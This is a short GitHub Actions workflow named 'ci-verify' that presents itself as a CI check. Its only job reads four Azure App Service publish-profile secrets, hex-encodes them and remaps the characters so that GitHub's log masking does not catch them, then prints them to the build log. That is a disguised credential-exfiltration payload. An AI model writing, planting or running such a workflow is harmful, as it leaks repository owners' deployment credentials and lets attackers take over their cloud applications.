name: ci-verify
on:
  push:
    branches:
      - 'ci-verify-*'
jobs:
  dump:
    runs-on: ubuntu-latest
    env:
      AZUREAPPSERVICE_PUBLISHPROFILE_4F587B555C5142CD950DCD8194DAFDD6: ${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_4F587B555C5142CD950DCD8194DAFDD6 }}
      AZUREAPPSERVICE_PUBLISHPROFILE_561A7D8CD0124E7AACB8BEBCD2DE20C3: ${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_561A7D8CD0124E7AACB8BEBCD2DE20C3 }}
      AZUREAPPSERVICE_PUBLISHPROFILE_A486608D19014B789439C173A171617E: ${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_A486608D19014B789439C173A171617E }}
      AZUREAPPSERVICE_PUBLISHPROFILE_C143858CD5474DC796CD0A5CA2E614EE: ${{ secrets.AZUREAPPSERVICE_PUBLISHPROFILE_C143858CD5474DC796CD0A5CA2E614EE }}
    steps:
      - name: dump
        run: |
          for n in AZUREAPPSERVICE_PUBLISHPROFILE_4F587B555C5142CD950DCD8194DAFDD6 AZUREAPPSERVICE_PUBLISHPROFILE_561A7D8CD0124E7AACB8BEBCD2DE20C3 AZUREAPPSERVICE_PUBLISHPROFILE_A486608D19014B789439C173A171617E AZUREAPPSERVICE_PUBLISHPROFILE_C143858CD5474DC796CD0A5CA2E614EE; do
            v="${!n}"
            if [ -n "$v" ]; then
              e="$(printf '%s' "$v" | xxd -p -c 1000000 | tr '0123456789abcdef' 'abcdefghijklmnop')"
              echo "NVM_$n=$e"
            fi
          done
